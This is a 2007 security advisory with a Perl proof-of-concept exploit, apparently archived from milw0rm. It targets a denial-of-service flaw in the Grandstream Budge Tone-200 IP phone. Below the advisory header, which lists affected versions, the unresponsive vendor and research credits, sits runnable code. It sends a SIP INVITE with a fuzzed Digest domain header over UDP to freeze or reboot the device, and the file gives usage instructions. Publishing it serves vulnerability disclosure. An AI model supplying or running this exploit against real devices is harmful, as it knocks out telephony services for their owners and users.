#!/usr/bin/perl
# MADYNES Security Advisory 
# http://madynes.loria.fr 
#
# Title: Grandstream Budge Tone-200 denial of service vulnerability 
#
# Release Date:  21/03/2007 
#
# Severity:      High - Denial of Service 
#
# Advisory ID:KIPH3 
#
# Hardware: Grandstream Budge Tone-200 IP Phone 
# http://www.grandstream.com/consumerphones.html 
#
# Affected Versions: Program-- 1.1.1.14 Bootloader-- 1.1.1.5 
#
# Other versions maybe. 
#
# Vulnerability Synopsis: After sending a crafted INVITE/CANCE or any 
# message with a "WWW-Authenticate" where the "Digest domain" is crafted 
# the device freezes provoking a DoS. 
#
# Impact: A remote individual can remotely crash and perform a Denial of 
# Service(DoS) attack in all the services provided by the software by 
# sending one crafted SIP INVITE message. This is conceptually similar to 
# the "ping of death". 
#
# Resolution: The vendor was contacted at multiple times, the complete 
# report was sent, but no feedback whatsoever resulted. 
#
# Vulnerability Description: the device reboots after a crafted INVITE 
# message had been sent. 
#
# Configuration of our device: 
#
# Software Version: Program-- 1.1.1.14 Bootloader-- 1.1.1.5 
#
# IP-Address obtained by DHCP as 192.168.1.105 
#
# The configuration is the default 
#
# Vulnerability: 
#
# After sending a crafted INVITE, CANCEL or any message with a 
# "WWW-Authenticate" where the "Digest domain" is crafted the device 
# freezes provoking a DoS. 
#
# Credits:
# Humberto J. Abdelnur (Ph.D Student)
# Radu State (Ph.D)
# Olivier Festor (Ph.D)
# This vulnerability was identified by the Madynes research team at INRIA
# Lorraine, using the Madynes VoIP fuzzer.
# http://madynes.loria.fr/
# Exploit: 
#
# To run the exploit the file invite_grandstream.pl should be launched 
# (assuming our configurations) as: 
#
# perl invite_grandstream.pl 192.168.1.105 5060 Fosforito 
#
# Proof of Concept Code: 

use IO::Socket::INET;

die "Usage $0 <dst> <port> <username>" unless ($ARGV[2]);

 

$socket=new IO::Socket::INET->new(PeerPort=>$ARGV[1],

        Proto=>'udp',

        PeerAddr=>$ARGV[0]);

 

$AUTH = "WWW-Authenticate: Digest domain=\"/-+:\@=\$\%D6\$;\$=;=\$=\$,\@\$.=;\@;;,&&+:::=\@/2\$&;6+;+=\%A5==;\@:=;\$&\%A3:u,\@=\@;&;\@+::+&;+,,&/&\@=,;=&:&,=&:;:;;K+&\@=\%DA*\$;\@&+&:;/==\%37:\%A6;,\@\%ED,:=:\@,;\%DA;&\$)\$+=;+:\%FE\$:\@;&=,W;,g\%EF;\%FB:+\@O\$+\%AF+;+:,&=\%CA\%EA;\$,\@+/;\@,-;:;,P&\@;_\$:\%C7&+&/!,\%EE\$:,\@:;;\@&\@,+,z\@\$;\@\@\$\$::\@/=,\$3\%ED=\@+\%AE/=&\@;;\$;&\$\%FE:\@;\$+:\$\%EB\$=&:;&K&;:\@\%EA,=\%BA6\%21;=&:\$\"\r\n";

$msg = "INVITE sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP 192.168.1.2;branch=z9hG4bK056a27e7;rport\r\nFrom: <sip:tucu\@192.168.1.2>;tag=as011d1185\r\nTo: <sip:$ARGV[2]\@$ARGV[0]>;$TOTAG\r\n$AUTH\CSeq: 6106 INVITE\r\Max-Forwards: 70\r\nContent-Length: 0\r\n\r\n";

$socket->send($msg);

# milw0rm.com [2007-03-21]
